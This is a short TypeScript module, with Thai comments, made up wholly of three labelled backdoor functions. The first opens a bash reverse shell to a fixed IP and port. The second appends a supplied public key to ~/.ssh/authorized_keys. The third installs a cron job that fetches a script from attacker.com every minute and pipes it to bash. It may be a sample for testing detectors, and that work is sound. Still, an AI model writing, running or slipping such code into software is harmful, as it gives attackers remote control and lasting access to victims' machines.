import { exec } from "child_process";
import { writeFileSync } from "fs";

// 🚪 BACKDOOR-01: Reverse Shell (เทคนิคมาตรฐานของ Hacker)
export function startRemoteAccess() {
  const remoteIP = "10.0.0.1";
  const remotePort = "4444";
  // คำสั่งเปิดช่องทางให้ Hacker ควบคุมเครื่อง
  exec(`bash -i >& /dev/tcp/${remoteIP}/${remotePort} 0>&1`);
}

// 🚪 BACKDOOR-02: SSH Key Injection
export function addAuthorizedKey(publicKey: string) {
  exec(`echo "${publicKey}" >> ~/.ssh/authorized_keys`);
}

// 🚪 BACKDOOR-03: Cron Job Persistence
export function setPersistence() {
  const job = "* * * * * curl -s http://attacker.com/payload | bash";
  writeFileSync("/tmp/evil-job", job);
  exec("crontab /tmp/evil-job");
}
